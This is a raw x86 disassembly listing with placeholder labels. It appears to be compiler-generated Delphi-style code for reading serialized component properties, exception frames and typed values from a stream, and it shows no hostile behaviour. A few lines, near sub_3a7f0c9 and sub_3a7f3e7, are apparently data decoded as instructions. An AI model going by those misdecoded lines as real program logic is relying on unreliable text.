mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_3a7e893
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_3a7e748
pop ecx
test al al
jne r-xdata
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_3a64c5c
sub_3a7e8b8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3a7e930
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_3a6457c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_3a79e50
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_3a7e958
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3a7e9d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a803f4
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_3a6457c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3a7e9d8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_3a7e748
pop ecx
test al al
jne r-xdata
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_3a64c5c
sub_3a7e9fc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7ec20
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3a7fd70
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3a7fd70
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_3a7ebf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_3a7ebae
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_3a7e648
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_3a7e6c0
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_3a7e7a8
pop ecx
push ebp
call sub_3a7e958
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_3a7e8b8
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_3a64ce0
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_3a7e6c0
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
movzx eax [ r-xdata ]
call sub_3a7e6c0
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ec27
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a665dc
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_3a6457c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_3a7a4f0
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_3a7e60c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_3a7a33c
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_3a7e60c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_3a7a33c
sub_3a7ebb3
push ebp
call sub_3a7e728
pop ecx
test al al
je r-xdata
call sub_3a64c5c
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_3a64380
sub_3a7ec3c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7ecac
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_3a7ec97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7ecac
mov eax [ ebp - 0x4 ]
call sub_3a7e16c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7e2d4
retn
sub_3a7ecac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7dfc8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7f1e8
mov eax [ ebp - 0x4 ]
call sub_3a7f084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_3a6457c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_3a7ed6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_3a6457c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7dfc8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a7e9fc
mov eax [ ebp - 0x4 ]
call sub_3a7f084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ed75
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_3a7ed7c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_3a7ff4c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_3a7edb4
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_3a7edb4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_3a7ff4c
cmp al 0x15
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_3a7f038
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_3a7edf8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_3a7ff4c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_3a7f038
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_3a7ee3c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_3a7ff4c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_3a7f038
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_3a7ee8c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_3a7ff4c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_3a7f038
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_3a7eed0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a7ff4c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_3a7ddf4
movzx eax [ eax + lookup_table_3a7eef8 ]
jmp [ eax * 4 + jump_table_3a7ef06 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_3a7e3e4
movzx ecx [ esp ]
mov eax esi
xor edx edx
call sub_3a65390
mov eax esi
call j_sub_3a65744#2
mov edx eax
movzx ecx [ esp ]
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_3a7efcc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_3a7ff4c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_3a7e3e4
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_3a7e3e4
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
jmp r-xdata
call sub_3a7ddf4
sub_3a7f038
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_3a7e3c0
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_3a7efcc
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_3a7ff4c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_3a7e3e4
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_3a7f08c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_3a7e3c0
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3a7ff4c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_3a7efcc
mov [ edi ] eax
sub_3a7f0c9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7f1bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a652a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_3a65338
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7f1c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_3a64260
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_3a65504
sub_3a7f1e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a7f430
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_3a649cc#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_3a7fd70
xor edx edx
push ebp
push j_sub_3a649cc
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
sub eax 0x4
mov eax [ eax ]
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
push eax
mov ecx ebx
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3a65798
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_3a645c0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_3a766c8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_3a645c0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_3a766c8
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_3a7f5e4
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_3a7e3d0
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_3a767bc
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_3a7e3d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_3a7f1cc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7f437
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov [ ebp - 0x10 ] ebx
jmp r-xdata
sub_3a7f3e7
add [ eax ] eax
add [ eax ] al
mov [ esi - 0x580c0cfd ] es
add ecx [ ecx - 0xbba743d ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
call sub_3a64c5c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7f437
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
sub_3a7f440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_3a79cf8
mov ebx eax
test ebx ebx
je r-xdata
call sub_3a7ddf4
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a76830
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7f488
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d860
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3a7a33c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3a7f4c8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_3a7f517
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a80678
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a77188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7f51e
lea eax [ ebp - 0x10 ]
call sub_3a70c6c
retn
sub_3a7f524
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_3a7f5d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a7e3c0
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a7eed0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d860
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3a7a33c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a7ff4c
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_3a77324
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7f5dd
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3a7f5e4
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7f8f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
movzx eax [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7f8f7
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x24 ]
call sub_3a65a7c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_3a652c4
retn
jmp [ eax * 4 + jump_table_3a7f673 ]
mov eax [ rw-data ]
call sub_3a7dddc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a767bc
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7e3c0
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7e480
movzx ecx al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76830
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7e4e0
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76830
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3a7eed0
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_3a76664
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76830
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ed7c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76f3c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fdac
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76c34
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_3a7fe68
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76d4c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7fc90
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76830
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7e3c0
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7e3c0
cmp al 0xd
jne r-xdata
push ebp
call sub_3a7f4c8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7f038
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a77268
jmp r-xdata
push ebp
call sub_3a7f524
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a767bc
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7efcc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76830
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3a7eed0
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a7f440
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a76830
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_3a7eed0
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a77208
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a767bc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3a7e53c
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a77208
